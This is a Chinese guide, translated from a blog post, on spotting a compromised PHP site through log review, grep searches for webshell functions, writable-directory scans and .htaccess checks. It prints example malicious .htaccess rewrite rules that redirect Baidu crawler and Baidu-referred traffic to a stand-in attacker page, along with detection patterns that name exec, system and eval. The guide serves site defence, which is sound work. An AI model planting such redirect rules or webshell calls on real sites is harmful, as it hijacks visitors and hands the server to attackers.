# 检测php网站是否已经被攻破的方法

**from :http://www.gregfreeman.org/2013/how-to-tell-if-your-php-site-has-been-compromised/**

0x01 查看访问日志
-----------

* * *

看是否有文件上传操作(POST方法)，

```
IPREMOVED - - [01/Mar/2013:06:16:48 -0600] "POST/uploads/monthly_10_2012/view.php HTTP/1.1" 200 36 "-" "Mozilla/5.0"
IPREMOVED - - [01/Mar/2013:06:12:58 -0600] "POST/public/style_images/master/profile/blog.php HTTP/1.1" 200 36 "-" "Mozilla/5.0"

```

nginx默认记录的日志格式为：  

```
access_log logs/access.log 

```

或

```
access_log logs/access.log combined;

```

nginx默认记录日志的位置为:

```
nginx安装目录/log/

```

0x02 查找含有恶意php代码的文件
-------------------

* * *

**2.1 查找最近发生变化的php文件**

```
find . -type f -name '*.php' -mtime -7

```

-type f 表示搜索正常的一般文件   -mtime -7 表示7*24小时内修改的文件

结果可能如下:

```
./uploads/monthly_04_2008/index.php
./uploads/monthly_10_2008/index.php
./uploads/monthly_08_2009/template.php
./uploads/monthly_02_2013/index.php

```

**2.2 查找文件中是否存在疑似代码**

```
find . -type f -name '*.php' | xargs grep -l "eval *(" --color 

```

 (*代表任意个空格)

```
find . -type f -name '*.php' | xargs grep -l "base64_decode *(" --color
find . -type f -name '*.php' | xargs grep -l "gzinflate *(" --color
find . -type f -name '*.php' | xargs grep -l "eval *(str_rot13 *(base64_decode *(" --color

```

注解：很多命令不支持管道传递参数，而实际上又需要这样，所以就用了xargs命令，这个命令可以用来管道传递参数；grep -l表示只包含某个字符串的文件名，如果去掉-l则会显示匹配特定字符串的行内容

几个特殊字符串的意义: eval()把字符串按照php代码来执行，是最常见的php一句话木马

base64_decode() 将字符串base64解码，攻击的时候payload是base64编码，则这个函数就有用武之地了

gzinflate() 将字符串解压缩处理，攻击的时候payload用gzdeflate压缩之后，使用这个函数进行解压缩

str_rot13() 对字符串进行rot13编码

也可以使用正则表达式来搜索文件，查找可以代码：

```
find . -type f -name '*.php' | xargs egrep -i "(mail|fsockopen|pfsockopen|stream\_socket\_client|exec|system|passthru|eval|base64_decode) *("

```

下面解释webshell常用的函数：

mail()：可用来向网站用户发送垃圾邮件

fsockopen():打开一个网络连接或者一个unix套接字连接，可用于payload发送远程请求

pfsockopen():和fsockopen()作用类似

stream_socket_client():建立一个远程连接，例子如下：

```
<?php
$fp = stream_socket_client("tcp://www.example.com:80", $errno, $errstr, 30);  
if (!$fp) {  
    echo "$errstr ($errno)<br />\n";  
} else {  
    fwrite($fp, "GET / HTTP/1.0\r\nHost: www.example.com\r\nAccept: */*\r\n\r\n");  
    while (!feof($fp)) {  
        echo fgets($fp, 1024);  
    }  
    fclose($fp);  
}  
?>

```

exec():命令执行函数

system():同exec()

passthru():同exec()

preg_replace()正则表达式由修饰符"e"修饰的时候，替换字符串在替换之前需要按照php代码执行，这种情况也需要考虑到，这种情况可采用这种以下扫搜：

```
find . -type f -name '*.php' | xargs egrep -i "preg_replace *\((['|\"])(.).*\2[a-z]*e[^\1]*\1 *," --color

```

0x03 比较代码文件
-----------

* * *

这种情况需要有一份干净的代码，这份代码和正在使用的代码进行比较。例如

```
diff -r wordpress-clean/ wordpress-compromised/ -x wp-content

```

上面的例子是比较wordpress-clean/ 和wordpress-comprised/两个目录，并且目录里面的wp-content/子目录不比较

0x04 搜寻可写的目录
------------

* * *

看这个目录里面是否有可疑文件，如下脚本查找权限为777的目录是否存在php文件

```
search_dir=$(pwd)
writable_dirs=$(find $search_dir -type d -perm 0777)
for dir in $writable_dirs
    do
        #echo $dir
        find $dir -type f -name '*.php'
done

```

黑客经常在jpg文件中插入php代码，因此在查询这些目录的时候也要查询jpg文件：

```
find wp-content/uploads -type f -iname '*.jpg' | xargs grep -i php

```

注意：-iname 表示文件名不区分大小写     grep -i 也表示不区分大小写

0x05 检测iframe标签
---------------

* * *

黑客经常做的是嵌入iframe标签，因此可以查看网页的源代码，并且搜索其中是否存在iframe标签，可使用如下命令：

```
grep -i '<iframe' mywebsite.txt

```

对于动态生成的页面，可使用ff的[Live HTTP Headers](https://addons.mozilla.org/en-US/firefox/addon/live-http-headers/)插件，下载到源码之后再查找是否存在iframe标签

0x06 查找数据库中是否存在敏感字符串
--------------------

* * *

包括%base64_%、%eval(%<等上面提到的一些关键词

0x07 检查.htaccess文件
------------------

* * *

是否包含了auto_prepend_file和auto_append_file，使用如下命令

```
find . -type f -name '\.htaccess' | xargs grep -i auto_prepend_file
find . -type f -name '\.htaccess' | xargs grep -i auto_append_file

```

auto_prepend_file的作用是加载当前脚本文件之前，先加载的php脚本 auto_append_file的作用是加载当前脚本文件之后，再加载的php脚本。黑客如果这么修改了.htaccess文件，那么可以在访问.htaccess目录的php脚本时，加载上自己想要加载的恶意脚本 .

htaccess文件还可以被用来把访问网站的流量劫持到黑客的网站，

```
RewriteCond %{HTTP_USER_AGENT}^.*Baiduspider.*$
Rewriterule ^(.*)$ http://www.hacker.com/muma.php [R=301]

```

将baidu爬虫的访问重定向到黑客的网站(包含HTTP_USER_AGENT和http关键字)

```
RewriteCond %{HTTP_REFERER} ^.*baidu.com.*$ Rewriterule ^(.*)$ http://www.hacker.com/muma.php [R=301]

```

将来自baidu搜索引擎的流量重定向到黑客的网站(包含HTTP_REFERER和http关键字) 为了查看网站是否被.htaccess修改导致流量劫持，可以在搜索.htaccess文件的时候采用如下命令： 

```
find . -type f -name '\.htaccess' | xargs grep -i http;
find . -type f -name '\.htaccess' | xargs grep -i HTTP_USER_AGENT; 
find . -type f -name '\.htaccess' | xargs grep -i HTTP_REFERER

```